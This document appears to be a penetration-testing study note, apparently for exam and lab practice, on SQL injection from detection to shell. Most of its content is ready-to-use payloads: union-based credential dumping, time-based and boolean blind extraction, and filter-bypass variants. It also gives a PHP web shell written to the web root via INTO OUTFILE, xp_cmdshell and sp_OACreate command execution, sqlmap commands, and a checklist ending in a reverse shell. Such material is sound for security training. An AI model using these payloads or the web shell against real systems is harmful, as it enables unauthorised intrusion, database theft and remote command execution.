---
title: SQL Injection - Initial Access & Data Extraction
tags: [exploitation, web, sqli, rce]
---

# SQL Injection: From Detection to Shell

## When to Use This
- Target has web application
- Parameters accept user input (URL, POST, cookies)
- SQL error messages visible or boolean-based responses

## Quick Detection

Check these for injection:
- URL parameters: ?id=1, ?search=, ?name=
- POST form fields
- Cookies
- HTTP headers (User-Agent, Referer)

Test with: ' OR '1'='1

## SQLi Types & Exploitation

### 1. Union-Based SQLi (Fastest)
Best when: You can see output directly

Basic command:
```sql
' UNION SELECT 1,2,3,4,5 -- -
' UNION SELECT NULL,NULL,NULL -- -
' UNION SELECT user(),database(),version(),4,5 -- -
```

Example: Extract from users table
```sql
' UNION SELECT id, username, password, email, 5 FROM users -- -
```

Database enumeration:
```sql
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users' -- -
```

### 2. Time-Based Blind SQLi (No Output)
Best when: No error messages, must infer data

Manual check:
```sql
' AND SLEEP(5) -- -
' OR SLEEP(5) -- -
```

If page delays 5 seconds = vulnerable

Extract single character:
```sql
' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0) -- -
```

### 3. Boolean-Based Blind SQLi (True/False)
Best when: Page responds differently for true/false

Test queries:
```sql
' AND '1'='1  (True response)
' AND '1'='2  (False response)
' AND LENGTH(user())>1  (True if username longer than 1 char)
' AND SUBSTRING(user(),1,1)='r'  (Test first character)
```

## Reaching RCE

### MySQL into file_priv (into OUTFILE)

Check for FILE privilege:
```sql
' UNION SELECT 1,2,3,FILE_PRIV,5 FROM mysql.user -- -
```

Write shell to web directory:
```sql
' UNION SELECT 1,2,'<?php system($_GET["cmd"]); ?>',4,5 INTO OUTFILE '/var/www/html/shell.php' -- -
```

Then access: http://target/shell.php?cmd=id

### Database Stored Procedures (SQL Server / MySQL 5.7.22+)

Microsoft SQL Server:
```sql
'; EXEC xp_cmdshell 'whoami'; --
'; EXEC sp_OACreate "WScript.Shell",@shell OUT; EXEC sp_OAMethod @shell,"Run",Null,"cmd.exe /c whoami"; --
```

## Related notes

The current migrated root writeups do not document a complete SQL injection chain. Use these links to compare adjacent input and source-review techniques without treating them as SQLi proof:

- [Web discovery and access control](02-Web-Discovery-and-Access-Control.md) — map inputs and establish the smallest reproducible request.
- [MonitorsFour](../../../../Writeups/HTB-Machines/MonitorsFour-Writeup.md) — authenticated command injection in Cacti; different sink, same input-to-execution reasoning.
- [Code](../../../../Writeups/HTB-Machines/Code.md) — older source-review notes; verify the evidence before extracting a SQL lesson.

## Tools

```bash
# Manual testing (recommended - shows why it works)
sqlmap -u "http://target/page?id=1" --dbs

# Faster full enumeration
sqlmap -u "http://target/page?id=1" --all-dbs --batch
```

## Common Bypass Filters

If basic payload blocked:

```sql
' /*!union*/ SELECT 1,2,3 -- -          (MySQL comments)
' UNiON SELECT 1,2,3 -- -               (Case variation)
' UNION/**/SELECT 1,2,3 -- -            (Comment bypass)
' AND 1=1 UNION SELECT NULL,NULL,NULL  (No quotes)
```

## Checklist During Exam

- [ ] Test obvious parameters with single quote
- [ ] Check for SQL errors in output
- [ ] Try UNION SELECT with increasing column numbers
- [ ] If no output, try time-based blind SQLi
- [ ] Extract database version and user
- [ ] Find tables containing credentials
- [ ] Either dump creds or write shell file
- [ ] Get reverse shell or command execution

## Next Step After SQLi Access

Once you have command execution or credentials:
- Get a shell with the [shell reference](../../../Reference/Shells.md).
- Escalate with [Linux privilege escalation](../../../04-Linux-Escalation/Techniques/Linux/04-Linux-Privilege-Escalation.md) or [Windows privilege escalation](../../../05-Windows-Escalation/Techniques/Windows/05-Windows-Privilege-Escalation.md).
